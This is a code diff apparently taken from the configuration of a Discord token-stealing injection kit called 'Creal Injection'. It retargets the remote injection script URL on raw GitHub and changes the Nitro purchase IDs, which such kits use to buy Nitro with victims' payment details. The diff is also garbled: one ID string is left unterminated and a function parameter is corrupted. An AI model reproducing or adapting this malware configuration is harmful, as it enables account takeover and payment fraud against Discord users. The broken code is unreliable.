@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Creal Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/fviatool/fvia/main/index.js', 
   /**
    
    **/
@@ -22,19 +22,19 @@ const config = {
   nitro: {
     boost: {
       year: {
-        id: '521847234246082599',
-        sku: '511651885459963904',
+        id: '1118080753566232606',
+        sku: '833351533189791764',
         price: '9999',
       },
       month: {
-        id: '521847234246082599',
+        id: '1118080753566232606',
         sku: '511651880837840896',
         price: '999',
       },
     },
     classic: {
       month: {
-        id: '521846918637420545',
+        id: '1118080753566232606
         sku: '511651871736201216',
         price: '499',
       },
@@ -387,7 +387,7 @@ function base32tohex(base32) {
   return hex;
 }
 
-function leftpad(str, len, pad) {
+function leftpad(str, le hd  gin, pad) {
   if (len + 1 >= str.length) {
     str = Array(len + 1 - str.length).join(pad) + str;
   }
